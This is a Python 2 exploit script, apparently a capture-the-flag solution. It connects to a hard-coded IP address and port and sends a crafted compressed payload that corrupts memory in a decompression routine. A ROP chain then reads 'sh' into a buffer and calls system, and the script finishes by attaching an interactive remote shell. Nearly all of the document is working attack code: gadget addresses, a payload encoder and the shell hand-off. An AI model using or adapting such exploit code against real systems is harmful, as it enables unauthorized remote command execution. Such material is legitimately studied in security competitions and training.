#!/usr/bin/env python

import sys
import socket
import struct
import telnetlib
import time


#s = socket.create_connection((" ", 13337))
sock = socket.create_connection(("95.138.166.12", 31337))


def interact():
    t = telnetlib.Telnet()
    t.sock = sock
    t.interact()


def ra(to=.5):
    buf = ""
    sock.setblocking(0)
    begin = time.time()
    while 1:
        if buf is not "" and time.time() - begin > to:
            break
        elif time.time() - begin > to*2:
            break
        try:
            data = sock.recv(4096)
            if data:
                begin = time.time()
                buf += data
            else:
                time.sleep(.1)
        except:
            pass

    sock.setblocking(1)
    return buf


def rt(delim):
    buf = ""
    while delim not in buf:
        buf += sock.recv(2)
    return buf


def se(data):
    sock.sendall(data)

def u32(d):
    return struct.unpack("<I", d)[0]

def u64(d):
    return struct.unpack("<Q",d)[0]


def p32(d):
    return struct.pack("<I", d)


def p64(d):
    return struct.pack("<Q", d)


def c8(s):
    return '1' + bin(ord(s))[2:].rjust(8, "0")

def cvn(v8, n, pad=0):
    s = ""
    while v8 > 0:
        s = s + "1" + bin(v8 & 0xf)[2:].rjust(4, "0")
        v8 = v8 >> 4
    t = ""
    while n > 0:
        t = t + "1" + bin(n & 0xf)[2:].rjust(4, "0")
        n = n >> 4

    return "01" + s + "0" + t + "10000"*pad + "0"

def comenc(s):
    s = s + "00"
    s = s + "0" * (8 - (len(s) % 8))
    out = ""
    while len(s) > 0:
        a = s[4:8][::-1]
        b = s[:4][::-1]
        out += hex(int(a+b,2))[2:].rjust(2, "0")
        s = s[8:]

    return out


def rop():
    scanf = 0x8048700
    format_u = 0x0804901B
    pop2 = 0x08048a35
    buf = 0x804b100
    system = 0x80486A0

    # use %u and scanf to read "sh\0\0" into a buffer, then call system with that buffer
    rop = [
        scanf,
        pop2,
        format_u,
        buf,
        system,
        1,
        buf
    ]
    rop = "".join(map(p32,rop))

    return rop


def pwn():
    # second decompression 
    payload = cvn(1, 1003) + cvn(1, 2389) + cvn(0, 2542)   + cvn(2**32-1, 5)  + cvn(8193, 100)
    payload = comenc(payload).decode("hex")

    # first decompression - writes second decompression on stack and copies it then to the right place
    # so it gets executed
    ropc = rop()
    s = c8("B") + c8("_")*4 + ''.join(map(c8,  "B"*10 + ropc + "B"*(90-len(ropc))))
    s += cvn(3,4)
    s += cvn(7,8)
    s += cvn(15,16,2)
    s += cvn(127,128)
    s += cvn(255,256)
    s += c8("Y") + "".join(map(c8, payload+"\0"*(30-len(payload)))) + c8("Y")
    s += cvn(511,512)
    s += cvn(1023,1007)
    s += cvn(1709,190)


    # send everything
    print "[+] Sending payload."
    se("1\n")
    se(comenc(s) + "\n")
    ra()
    se(str(struct.unpack("I", "sh\0\0")[0]) + "\n")
    ra()

    print "[+] Shell: "

    interact()
pwn()

